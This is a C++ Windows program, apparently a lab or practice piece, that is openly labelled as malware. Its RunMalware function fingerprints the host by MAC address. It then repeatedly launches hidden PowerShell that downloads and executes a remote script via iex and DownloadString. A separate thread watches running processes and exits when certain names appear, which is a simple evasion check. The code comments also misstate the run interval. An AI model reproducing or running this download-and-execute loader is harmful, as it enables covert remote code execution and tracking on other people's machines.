#include "Header.h"
#pragma warning( disable : 5039 5045)

#pragma warning( push )
#pragma warning( disable : 4820 4668 4365)
#include <WinSock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <WtsApi32.h>
#include <iomanip>
#pragma warning( pop )
#include <Psapi.h>
#include <iostream>
#include <sstream>


// Uses 'EnumProcesses', 'OpenProcess', and 'GetModuleBaseName' functions from 'Psapi' library.
bool GetProcessNamesByPsApi(vector<wstring>& running_processes) {

    DWORD processes[1024];
    DWORD cb_needed;

    // Enumerate all processes into processes argument
    if (!EnumProcesses(processes, sizeof(processes), &cb_needed)) {
        printf("Failed to enumerate processes. Error code: %lu", GetLastError());
        return false;
    }

    // Calculate the number of processes
    const DWORD process_count = cb_needed / sizeof(DWORD);

    for (DWORD i = 0; i < process_count; ++i) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess == NULL) {
            continue;
        }

        wchar_t sz_process_name[MAX_PATH];
        if (GetModuleBaseNameW(hProcess, NULL, sz_process_name, sizeof(sz_process_name) / sizeof(wchar_t))) {
            wstring process_name(sz_process_name);
            running_processes.push_back(process_name);
        }

        CloseHandle(hProcess);
    }

    return true;
}


// Uses 'WTSEnumerateProcesses' function from 'WtsApi' library.
bool GetProcessNamesByWtsApi(vector<wstring>& running_processes) {

    WTS_PROCESS_INFO* pWPIs = NULL;
    DWORD dwProcCount = 0;

    if (!WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pWPIs, &dwProcCount))
    {
        return false;
    }

    //save all process names retrieved
    for (DWORD i = 0; i < dwProcCount; i++)
    {
        const wstring process_name(pWPIs[i].pProcessName);
        running_processes.push_back(process_name);
    }

    //Free memory
    if (pWPIs)
    {
        WTSFreeMemory(pWPIs);
        pWPIs = NULL;
    }

    return true;
}


bool IsAnyProcessRunning(const unordered_set<wstring>& target_processes, const vector<wstring>& running_processes)
{
    for (const wstring& tProcess : running_processes) {
        if (target_processes.count(tProcess)) {
            return true;
        }
    }

    return false;
}


bool RunMalware() {
    wstring mac_address;
    wstring web_address = L"http://127.0.0.1:80/messageBox.ps1?";
    if (!GetMacAddress(mac_address)) {
        printf("Failed to get mac address!");
        return 1;
    }

    wstring script = L"Add-Type -AssemblyName PresentationFramework\n"
        "iex ((New-Object System.Net.WebClient).DownloadString('" 
        + web_address + L"?macAddress=" + mac_address + L"'))";
    LPCWSTR psScript = script.c_str();

    // Execute mallware
    while (true)
    {
        HINSTANCE hInstance = ShellExecute(NULL, L"open", L"powershell.exe", psScript, NULL, SW_HIDE);
        if (reinterpret_cast<intptr_t>(hInstance) <= 32) {
            // ShellExecute failed
            return false;
        }
        printf("ok");
        Sleep(7000);
    }

    return true;
}


DWORD WINAPI ProccessChecker(LPVOID lpParam) {
    (void)lpParam;

    static const unordered_set<wstring> target_processes{ L"VsDebugConsol1e.exe", L"slack.exe1" , L"OneDrive.exe1" };

    while (true)
    {
        vector<wstring> running_processes;
        if (!GetProcessNamesByWtsApi(running_processes)) {
            exit(EXIT_FAILURE);
        }

        if (IsAnyProcessRunning(target_processes, running_processes)) {
            exit(EXIT_FAILURE);
        }
    }
}


bool GetMacAddress(wstring& macAddress) {
    ULONG bufferSize = 0;

    // Get bufferSize
    DWORD result = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &bufferSize);
    if (result != ERROR_BUFFER_OVERFLOW) {
        printf("Failed to get adapter addresses. Error code: %lu\n", result);
        return false;
    }

    // Allocate memory for adapter addresses
    IP_ADAPTER_ADDRESSES* pAddresses = reinterpret_cast<IP_ADAPTER_ADDRESSES*>( HeapAlloc(GetProcessHeap(), 0, bufferSize));
    if (pAddresses == nullptr) {
        printf("Error allocating memory needed to call GetAdaptersAddresses\n");
        return false;
    }

    // Get adapter addresses
    result = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &bufferSize);
    if (result != NO_ERROR) {
        printf("Failed to get adapter addresses. Error code: %lu\n", result);
        HeapFree(GetProcessHeap(), 0, pAddresses);
        return false;
    }

    // Contains pointer to current adapter addresses
    IP_ADAPTER_ADDRESSES* pAdapter = pAddresses;
    while (pAdapter != nullptr) {
        if (pAdapter->PhysicalAddressLength <= 0) {
            pAdapter = pAdapter->Next;
            continue;
        }

        wstringstream ss;
        for (DWORD i = 0; i < pAdapter->PhysicalAddressLength; i++) {
            ss << uppercase << hex << setw(2) << setfill(L'0') << static_cast<int>(pAdapter->PhysicalAddress[i]);
            if (i < pAdapter->PhysicalAddressLength - 1) {
                ss << L":";
            }
        }

        macAddress = ss.str();
        break;

    }

    HeapFree(GetProcessHeap(), 0, pAddresses);
    return true;
}


#ifndef _TESTS
int main(void)
{
    // Runs process-checker in a separate treade, once it fails it exits the entire process.
    HANDLE hThread = CreateThread(NULL, 0, ProccessChecker, NULL, 0, NULL);
    if (NULL == hThread) {
        printf("Failed to create process-checker thread!");
        return 1;
    }
    
    // Every 5 minutes runs the malware
    if (!RunMalware())
    {
        printf("Failed to run malware!");
    }

    return 0;
}
#endif